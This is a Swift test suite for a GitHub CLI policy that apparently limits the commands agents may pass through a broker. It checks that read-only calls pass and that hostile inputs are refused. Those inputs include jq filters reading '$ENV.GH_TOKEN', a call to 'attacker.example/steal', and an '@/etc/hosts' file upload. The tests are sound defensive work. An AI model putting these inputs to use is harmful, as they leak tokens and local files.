import Foundation
import Testing
@testable import HostControlToolSupport

@Suite("GitHub host-control read policy")
struct GitHubHostControlPolicyTests {
    /// Read-only calls agents made in production that the broker refused
    /// before jq filters and REST GETs were exposed.
    @Test("Read-only jq filters and REST GETs are allowed", arguments: [
        ["pr", "view", "111", "--repo", "example/project", "--json", "number,body,files", "--jq", "{number,body,files}"],
        ["pr", "list", "--repo", "example/project", "--state", "all", "--json", "number,title", "-q", ".[].number"],
        ["pr", "view", "7", "--json", "number", "-cq", ".number"],
        ["pr", "view", "7", "--json", "files", "--jq=[.files[].path]"],
        ["pr", "view", "7", "--json", "body", "--jq", ".env"],
        ["pr", "view", "7", "--json", "body", "--jq", "{environment: .body}"],
        ["pr", "view", "7", "--json", "body", "--jq", ".[\"env\"]"],
        ["pr", "list", "--json", "title", "--jq", ".[] | select(.title == \"env\")"],
        ["pr", "view", "7", "--json", "number", "--jq", "{env: .number}"],
        ["pr", "view", "7", "--json", "number", "--jq", "{a: 1, env: .number}"],
        ["pr", "view", "7", "--json", "number", "--jq", "\"#\\(.number) env\""],
        ["api", "repos/example/project/commits/main", "--jq", ".sha"],
        ["api", "--method", "GET", "repos/example/project/contents/src/a.py?ref=e100", "-H", "Accept: application/vnd.github.raw+json"],
        ["api", "repos/example/project/pulls/107/files", "--paginate", "--jq", ".[] | {filename,patch}"],
        ["api", "repos/example/project/pulls/997/files?per_page=5&page=4"],
        ["api", "-XGET", "repos/example/project/branches/main"],
        ["api", "--method=head", "repos/example/project"],
        ["api", "-iX", "GET", "repos/example/project"],
        ["api", "repos/{owner}/{repo}/compare/a...b", "--paginate", "--slurp", "--silent"],
        ["api", "--hostname", "github.com", "--cache", "1h", "repos/example/project", "-t", "{{.name}}"]
    ])
    func allowsReads(_ arguments: [String]) {
        #expect(GitHubHostControlPolicy.denialReason(for: arguments) == nil)
    }

    @Test("jq filters cannot read the broker's environment", arguments: [
        ["pr", "view", "7", "--json", "number", "--jq", "env"],
        ["pr", "view", "7", "--json", "number", "--jq", "$ENV.GH_TOKEN"],
        ["pr", "view", "7", "--json", "number", "--jq=env.HOME"],
        ["pr", "view", "7", "--json", "number", "-qenv"],
        ["pr", "view", "7", "--json", "number", "-cq", "[env]"],
        ["pr", "view", "7", "--json", "number", "--jq", "{a: .number, b: \"\\(env)\"}"],
        ["api", "repos/example/project", "--jq", ".name | env"],
        ["pr", "view", "7", "--json", "number", "--jq", "\"\\(\"x\" + (env | tostring))\""],
        ["pr", "view", "7", "--json", "number", "--jq", "{env: env}"],
        ["pr", "view", "7", "--json", "number", "--jq", "{$ENV}"],
        ["pr", "view", "7", "--json", "number", "--jq", "{(env | tostring): 1}"],
        ["pr", "view", "7", "--json", "number", "--jq", ".[env:]"],
        ["pr", "view", "7", "--json", "number", "--jq", "\"\\\"\" + (env | tostring)"]
    ])
    func deniesEnvironmentReads(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("cannot read the environment"))
    }

    @Test("jq comments are refused, since they could hide a quote from the scan")
    func deniesJQComments() throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(
            for: ["pr", "view", "7", "--json", "number", "--jq", "# \"\n[env,\n\"x\"]"]
        ))
        #expect(reason.contains("jq comments are not exposed"))
    }

    @Test("auth status output stays unfiltered")
    func deniesAuthFilters() throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(
            for: ["auth", "status", "--json", "hosts", "--jq", ".hosts"]
        ))
        #expect(reason.contains("credential and token display flags are not exposed"))
    }

    @Test("API writes and wider requests stay denied", arguments: [
        ["api", "--method", "DELETE", "/repos/example/project"],
        ["api", "-X", "PATCH", "repos/example/project", "-f", "name=x"],
        ["api", "-XPOST", "repos/example/project/issues"],
        ["api", "repos/example/project/issues", "-f", "title=bug"],
        ["api", "repos/example/project/issues", "--raw-field=title=bug"],
        ["api", "repos/example/project/issues", "-F", "body=@/etc/hosts"],
        ["api", "--method", "GET", "search/issues", "-f", "q=repo:example/project"],
        ["api", "repos/example/project/issues", "--input", "payload.json"],
        ["api", "graphql", "-f", "query={viewer{login}}"],
        ["api", "graphql"],
        ["api", "/graphql"],
        ["api", "https://attacker.example/steal"],
        ["api", "--hostname", "attacker.example", "repos/example/project"],
        ["api", "--hostname=enterprise.example", "repos/example/project"],
        ["api", "--hostname", "", "repos/example/project"],
        ["api", "repos/example/project", "-H", "X-HTTP-Method-Override: DELETE"],
        ["api", "repos/example/project", "--verbose"],
        ["api", "repos/example/project", "--jq=", "--method=DELETE"],
        ["api", "repos/example/project", "--template=", "-X", "DELETE"],
        ["api", "repos/example/project", "repos/other/project"],
        ["api"],
        ["api", "repos/example/project", "--unknown-flag"]
    ])
    func deniesNonReads(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("does not allow GitHub operation"))
    }

    @Test("Browser launch and token display stay denied with their own reasons")
    func keepsExistingDenials() throws {
        let web = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "--web"]))
        #expect(web.contains("opening a browser"))
        let bundledWeb = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "-cw"]))
        #expect(bundledWeb.contains("opening a browser"))
        let token = try #require(GitHubHostControlPolicy.denialReason(for: ["auth", "status", "--show-token"]))
        #expect(token.contains("credential and token display"))
        #expect(GitHubHostControlPolicy.denialReason(for: ["auth", "token"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["pr", "create", "--title", "x"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["run", "watch", "1"]) != nil)
    }
}
